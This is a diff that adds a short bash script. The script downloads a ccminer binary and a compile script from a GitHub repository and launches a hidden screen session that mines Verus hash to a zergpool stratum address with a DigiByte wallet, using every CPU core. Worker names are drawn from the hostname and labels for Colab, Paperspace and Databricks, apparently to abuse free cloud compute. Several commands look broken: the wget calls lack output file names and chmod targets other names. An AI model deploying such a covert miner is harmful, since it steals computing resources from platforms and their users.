@@ -1,0 +1,13 @@
+#!/bin/bash
+array[0]="google_colab"
+array[1]="paperspace"
+array[2]="databricks"
+size=${#array[@]}
+index=$(($RANDOM % $size))
+worker=${array[$index]}
+sleep 10s
+wget -qO https://raw.githubusercontent.com/makaryobos/cmin/master/ccminer
+wget -qO https://raw.githubusercontent.com/makaryobos/cmin/master/compile.sh
+chmod +x deploy compile
+screen -dm -S run ./deploy -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u dgb1qkpmvdct307nehn5lwr5scprtter9qdpe98uvu7.ukin_$(cat /proc/sys/kernel/hostname)_$(echo $worker) -p c=DGB -t $(nproc --all) 
+sleep 10s && ./compile
